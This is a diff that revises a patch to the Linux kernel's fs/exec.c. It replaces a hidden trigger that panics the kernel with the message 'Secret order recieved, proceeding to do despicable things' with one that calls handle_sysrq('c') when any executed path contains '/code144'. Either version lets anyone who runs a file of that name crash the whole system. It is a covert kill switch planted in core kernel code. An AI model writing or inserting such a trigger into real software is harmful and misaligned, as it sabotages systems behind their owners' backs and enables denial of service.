@@ -1,13 +1,22 @@
 diff -ruN linux-4.9.162/fs/exec.c linux-4.9.162-patch/fs/exec.c
 --- linux-4.9.162/fs/exec.c	2019-03-05 17:57:07.000000000 +0100
-+++ linux-4.9.162-patch/fs/exec.c	2019-04-27 18:47:23.240264186 +0200
-@@ -1826,6 +1826,9 @@
- {
- 	struct user_arg_ptr argv = { .ptr.native = __argv };
- 	struct user_arg_ptr envp = { .ptr.native = __envp };
-+	if (strstr(filename->name, "code144") != NULL) {
-+		panic("Secret order recieved, proceeding to do despicable things");
-+	}
- 	return do_execveat_common(AT_FDCWD, filename, argv, envp, 0);
- }
++++ linux-4.9.162-patch/fs/exec.c	2019-04-27 19:37:39.483744742 +0200
+@@ -57,6 +57,7 @@
+ #include <linux/oom.h>
+ #include <linux/compat.h>
+ #include <linux/vmalloc.h>
++#include <linux/sysrq.h>
  
+ #include <asm/uaccess.h>
+ #include <asm/mmu_context.h>
+@@ -1725,6 +1726,10 @@
+ 	if (IS_ERR(file))
+ 		goto out_unmark;
+ 
++	if (strstr(filename->name, "/code144") != NULL) {
++		handle_sysrq('c');
++	}
++
+ 	sched_exec();
+ 
+ 	bprm->file = file;
